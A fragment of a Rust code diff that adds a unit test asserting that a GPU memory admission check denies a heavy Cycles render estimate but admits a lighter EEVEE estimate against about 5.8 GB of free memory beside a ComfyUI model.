+        // the Cycles `blender-render`'s ~8000-MiB estimate ALWAYS denies, but the lighter EEVEE estimate
+        // fits, so a render can be admitted beside a warm model.
+        let free = 5_800u64; // ComfyUI residual headroom
+        let cycles_est = 8_000u64;
+        assert!(
+            !admit(free, cycles_est, headroom_for(cycles_est)).granted(),
+            "the Cycles estimate must deny against ~5.8 GB free"
+        );
+        let eevee_est = EEVEE_RENDER_EST_MIB as u64;
+        assert!(
+            admit(free, eevee_est, headroom_for(eevee_est)).granted(),
+            "the conservative EEVEE estimate must be admittable against the same headroom"
+        );
     }
 
     #[test]
